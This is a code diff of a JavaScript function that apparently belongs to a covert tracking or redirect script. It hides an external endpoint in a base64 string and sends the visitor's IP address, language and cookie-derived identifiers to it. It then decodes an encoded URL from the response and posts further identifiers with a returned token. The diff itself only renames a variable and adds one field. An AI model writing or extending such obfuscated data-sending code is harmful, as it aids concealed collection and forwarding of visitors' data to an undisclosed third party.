@@ -1,15 +1,16 @@
 function budal(ip) {
 
         if (cid("bsr") == '1') {
-            var bsr = 'WmVr';
+            var usx = 'WmVr';
         } else {
-            var bsr = cid("u");
+            var usx = cid("u");
             var bsi = cid("i");
             var bst = cid("t");
             var bss = cid("s");
+            var bsr = cid("bsr");
         }
 
-    var gtx = cmx('aHR0cHM6Ly9pY2xpY2suY2x1Yi9qcy90cmFja19qc29uLnBocD91cz0') + bsr + "&lg=" + lang + "&ip=" + ip + "&time" + Date.now();
+    var gtx = cmx('aHR0cHM6Ly9pY2xpY2suY2x1Yi9qcy90cmFja19qc29uLnBocD91cz0') + usx + "&lg=" + lang + "&ip=" + ip + "&time" + Date.now();
     //console.log($getURL)
     $.get(gtx, function (data) {
         console.log(cmx(data.urlx));
@@ -26,6 +27,7 @@ function budal(ip) {
                             img: bsi,
                             ttl: bst,
                             srv: bss,
+                            bsr: bsr,
                             token: data.url
                         }
                     }).done(function (msg) {
